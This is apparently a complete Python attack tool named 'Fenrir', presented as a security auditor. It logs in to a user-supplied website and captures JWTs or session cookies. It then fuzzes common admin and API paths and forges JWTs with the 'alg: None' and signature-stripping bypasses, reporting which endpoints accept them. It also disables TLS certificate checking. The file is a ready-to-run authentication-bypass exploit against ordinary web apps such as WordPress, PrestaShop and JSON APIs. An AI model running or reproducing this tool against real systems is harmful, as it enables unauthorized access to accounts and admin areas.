import asyncio
import aiohttp
import hmac
import hashlib
import base64
import json
import sys
import re
import time
import logging
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Any, Callable, Generator, Coroutine
from enum import Enum, auto
from functools import wraps

# ==============================================================================
#  🛠️ CONFIGURACIÓN & UTILS (ARCHITECT LEVEL)
# ==============================================================================

# Configuración de Logging para no perder detalle sin ensuciar la consola
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger("FENRIR")

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"

# --- DECORATORS ---

def audit_log(func: Callable[..., Any]) -> Callable[..., Any]:
    """Decorador para trazar operaciones críticas de seguridad."""
    @wraps(func)
    def wrapper(*args, **kwargs):
        # Introspección: Vemos qué método se llama
        method_name = func.__name__.upper()
        logger.debug(f"⚡ Ejecutando vector: {method_name}")
        return func(*args, **kwargs)
    return wrapper

def async_timer(func: Callable[..., Coroutine]) -> Callable[..., Coroutine]:
    """Decorador de telemetría para medir latencia de red."""
    @wraps(func)
    async def wrapper(*args, **kwargs):
        start = time.perf_counter()
        result = await func(*args, **kwargs)
        end = time.perf_counter()
        elapsed = (end - start) * 1000
        if elapsed > 800: # Solo avisar si es lento
            logger.warning(f"🐢 Latencia alta en {func.__name__}: {elapsed:.2f}ms")
        return result
    return wrapper

# --- DATA STRUCTURES (DDD) ---

class AuthMode(Enum):
    NONE = auto()
    JWT = auto()    # Modo Moderno (API)
    COOKIE = auto() # Modo Legacy (WordPress/PrestaShop clásico)

@dataclass(frozen=True)
class TargetConfig:
    """Configuración inmutable del objetivo."""
    base_url: str
    user_agent: str = "Fenrir/2.0-Architect"
    timeout: int = 15

@dataclass
class AuthResult:
    """DTO para el resultado de la autenticación."""
    mode: AuthMode
    artifact: str  # Token JWT o nombre de la Cookie principal
    success: bool

# ==============================================================================
#  🧠 BUSINESS LOGIC: LOW LEVEL MANIPULATION
# ==============================================================================

class JWTManipulator:
    """Utilidades estáticas para cirugía de tokens."""
    
    @staticmethod
    def b64url_decode(data: str) -> bytes:
        padding = 4 - (len(data) % 4)
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data)

    @staticmethod
    def b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

    @classmethod
    def forge_token(cls, header: Dict, payload: Dict, signature: bytes = b"") -> str:
        h_b64 = cls.b64url_encode(json.dumps(header).encode())
        p_b64 = cls.b64url_encode(json.dumps(payload).encode())
        s_b64 = cls.b64url_encode(signature) if signature else ""
        return f"{h_b64}.{p_b64}.{s_b64}"

# ==============================================================================
#  🐺 CORE ENGINE: FENRIR
# ==============================================================================

class FenrirEngine:
    """
    Motor híbrido de auditoría.
    Implementa Context Manager asíncrono y Strategy Pattern para auth.
    """
    
    def __init__(self, config: TargetConfig):
        self.config = config
        self.session: Optional[aiohttp.ClientSession] = None
        self._token: Optional[str] = None
        self.auth_mode: AuthMode = AuthMode.NONE

    async def __aenter__(self):
        # CookieJar inseguro para aceptar cookies sin rechistar
        jar = aiohttp.CookieJar(unsafe=True)
        connector = aiohttp.TCPConnector(limit=50, ssl=False) # High concurrency
        
        self.session = aiohttp.ClientSession(
            base_url=self.config.base_url,
            connector=connector,
            cookie_jar=jar, # <--- MEMORIA DE COOKIES AUTOMÁTICA
            headers={"User-Agent": self.config.user_agent},
            timeout=aiohttp.ClientTimeout(total=self.config.timeout)
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session: await self.session.close()

    @property
    def token(self) -> str:
        return self._token if self._token else ""

    @token.setter
    def token(self, value: str):
        self._token = value
        # Si forzamos un token, asumimos modo JWT
        if self.session and value:
            self.session.headers.update({"Authorization": f"Bearer {value}"})
            self.auth_mode = AuthMode.JWT

    @async_timer
    async def pre_flight_check(self) -> bool:
        """Ping rápido para ver si el host está vivo."""
        print(colorize("\n🧠 FASE 0: PRE-FLIGHT CHECK", Colors.BOLD))
        if not self.session: raise RuntimeError("Session not initialized")
        try:
            async with self.session.get("/") as resp:
                print(colorize(f"✅ Host activo: {resp.status}", Colors.GREEN))
                return True
        except Exception as e:
            logger.critical(f"Host inalcanzable: {str(e)}")
            return False

    @audit_log
    async def hunt_credentials(self, login_path: str, creds: Dict[str, str]) -> AuthResult:
        """
        Lógica híbrida: Intenta login y detecta si recibe Token (Moderno) o Cookie (Legacy).
        """
        print(colorize(f"🕵️  Cazando credenciales en: {login_path}", Colors.YELLOW))
        
        if not self.session: raise RuntimeError("Session not initialized")

        try:
            # ESTRATEGIA A: JSON POST (APIs Modernas)
            async with self.session.post(login_path, json=creds) as resp:
                text = await resp.text()
                
                # 1. ¿Hay JWT en la respuesta?
                token = self._extract_token_regex(text)
                if token:
                    print(colorize("✅ [JWT] Token capturado. Modo API.", Colors.GREEN))
                    return AuthResult(AuthMode.JWT, token, True)
                
                # 2. ¿Hay Cookies en la respuesta?
                if self.session.cookie_jar.filter_cookies(self.config.base_url):
                    print(colorize("✅ [COOKIE] Sesión (JSON). Modo Legacy.", Colors.GREEN))
                    self._print_cookies()
                    return AuthResult(AuthMode.COOKIE, "SessionCookie", True)

            # ESTRATEGIA B: FORM DATA (Legacy WordPress/PrestaShop)
            print("   ⚠️ JSON falló o no dio auth. Probando Form Data estándar...")
            async with self.session.post(login_path, data=creds) as resp_form:
                 # Chequeo de Cookies post-form
                 if self.session.cookie_jar.filter_cookies(self.config.base_url):
                    print(colorize("✅ [COOKIE] Sesión (Form). Modo Legacy.", Colors.GREEN))
                    self._print_cookies()
                    return AuthResult(AuthMode.COOKIE, "SessionCookie", True)
                 
                 # Último intento: A veces el token viene en el HTML del redirect
                 text_form = await resp_form.text()
                 token = self._extract_token_regex(text_form)
                 if token:
                     print(colorize("✅ [JWT] Token oculto en HTML.", Colors.GREEN))
                     return AuthResult(AuthMode.JWT, token, True)

        except Exception as e:
            logger.error(f"Error durante autenticación: {e}")
        
        return AuthResult(AuthMode.NONE, "", False)

    def _extract_token_regex(self, content: str) -> Optional[str]:
        match = re.search(r'eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+', content)
        return match.group(0) if match else None

    def _print_cookies(self):
        if not self.session: return
        for cookie in self.session.cookie_jar:
            print(f"   🍪 {cookie.key}: {cookie.value[:15]}...")

    async def fuzz_endpoints(self, wordlist: List[str]) -> List[str]:
        """Discovery asíncrono masivo."""
        mode_str = self.auth_mode.name
        print(colorize(f"\n🐕 RASTREANDO ({mode_str})...", Colors.BOLD))
        
        tasks = [self._check_endpoint(path) for path in wordlist]
        results = await asyncio.gather(*tasks)
        found = [r for r in results if r is not None]
        
        if not found:
            print(colorize("🤷 Sin presas claras.", Colors.CYAN))
        return found

    async def _check_endpoint(self, path: str) -> Optional[str]:
        if not self.session: return None
        try:
            # Allow_redirects=False para detectar redirecciones de auth (302)
            async with self.session.get(path, allow_redirects=True) as resp:
                status = resp.status
                if status == 200:
                    print(f"  -> {colorize('ACCESIBLE [200]', Colors.GREEN)} {path}")
                    return path
                elif status == 403:
                    print(f"  -> {colorize('PROTEGIDO [403]', Colors.YELLOW)} {path}")
                    return path
                elif status == 401:
                    print(f"  -> {colorize('AUTH REQ [401]', Colors.RED)} {path}")
        except: pass
        return None

    # --- ATTACK MODULES ---

    def _generate_jwt_attacks(self) -> Generator[Dict[str, Any], None, None]:
        """Generador de payloads para ataque JWT."""
        if not self.token: return
        parts = self.token.split('.')
        if len(parts) != 3: return

        try:
            header = json.loads(JWTManipulator.b64url_decode(parts[0]))
            payload = json.loads(JWTManipulator.b64url_decode(parts[1]))
            
            # 1. Algoritmo None
            h_none = header.copy(); h_none['alg'] = 'None'
            yield {
                "name": "Algorithm None Bypass",
                "token": JWTManipulator.forge_token(h_none, payload)
            }
            
            # 2. Stripped Signature
            yield {
                "name": "Signature Stripping",
                "token": f"{parts[0]}.{parts[1]}."
            }

        except Exception as e:
            logger.error(f"Error generando ataques: {e}")

    async def execute_attacks(self, targets: List[str]):
        print(colorize("\n⚔️  FASE DE ATAQUE", Colors.BOLD))
        
        if self.auth_mode == AuthMode.COOKIE:
            print(colorize("ℹ️ Modo Cookie activo: Ataques criptográficos JWT omitidos.", Colors.CYAN))
            print("   (Se ha verificado el acceso; intenta buscar endpoints sensibles manualmente).")
            return

        if self.auth_mode == AuthMode.JWT:
            print("🔥 Iniciando manipulación de Token...")
            for target_url in targets:
                print(f"🎯 Target: {target_url}")
                for attack in self._generate_jwt_attacks():
                    await self._send_jwt_attack(target_url, attack["token"], attack["name"])

    async def _send_jwt_attack(self, url: str, token: str, attack_name: str):
        if not self.session: return
        try:
            # Sobrescribimos header solo para esta petición
            headers = {"Authorization": f"Bearer {token}"}
            async with self.session.get(url, headers=headers) as resp:
                if resp.status == 200:
                     print(colorize(f"  🎉 [VULNERABLE] {attack_name}: BYPASS EXITOSO", Colors.GREEN))
                else:
                    # Logging silencioso para no saturar
                    logger.debug(f"{attack_name} falló con {resp.status}")
        except Exception: pass

# ==============================================================================
#  🏁 MAIN ENTRY POINT
# ==============================================================================

async def main():
    print(colorize("""
    🐺  F E N R I R   v 2.0  🐺
    [ Hybrid Security Auditor ]
    """, Colors.RED))

    # Input Handling
    base_url = input(">> URL Base (ej: https://miweb.com): ").strip()
    if not base_url.startswith("http"): base_url = f"http://{base_url}"
    
    config = TargetConfig(base_url=base_url)

    # Context Manager inicia la sesión
    async with FenrirEngine(config) as engine:
        
        # 1. Pre-flight
        if not await engine.pre_flight_check():
            if input(">> ¿Continuar a ciegas? (s/N): ").lower() != 's':
                sys.exit(0)

        # 2. Auth Flow
        print("\n[1] Auto-Login (Inteligente - JWT/Cookie)")
        print("[2] Pegar Token JWT Manual")
        choice = input(">> Opción: ").strip()

        if choice == '1':
            user = input("User/Email: ")
            pwd = input("Password: ")
            login_path = input(">> Login Path (Enter para default): ").strip()
            
            # Heurística simple de login path si está vacío
            if not login_path:
                if "wp-" in base_url or "wordpress" in base_url: login_path = "/wp-login.php"
                elif "prestashop" in base_url: login_path = "/admin/index.php" # Simplificado
                else: login_path = "/auth/login"
            
            # Credenciales genéricas para probar JSON y Form
            creds = {"email": user, "username": user, "password": pwd}
            
            auth_result = await engine.hunt_credentials(login_path, creds)
            
            if auth_result.success:
                engine.auth_mode = auth_result.mode
                if auth_result.mode == AuthMode.JWT:
                    engine.token = auth_result.artifact
            else:
                print(colorize("❌ Autenticación fallida. Revisa URL o credenciales.", Colors.RED))
                sys.exit(1)

        else:
            token = input(">> Pega tu Token: ").strip()
            if not token: sys.exit(1)
            engine.token = token # Setter configura AuthMode.JWT

        # 3. Discovery & Attack
        # Lista ampliada para cubrir CMS clásicos y APIs
        common_paths = [
            "/admin", "/administrator", "/dashboard", "/backoffice",
            "/api/v1/users", "/api/v1/profile", "/wp-admin/profile.php",
            "/user/settings", "/account", "/secure"
        ]
        
        targets = await engine.fuzz_endpoints(common_paths)
        await engine.execute_attacks(targets)

if __name__ == "__main__":
    try:
        if sys.platform == 'win32':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Operación abortada.")
    except Exception as e:
        print(f"\n❌ Error fatal: {e}")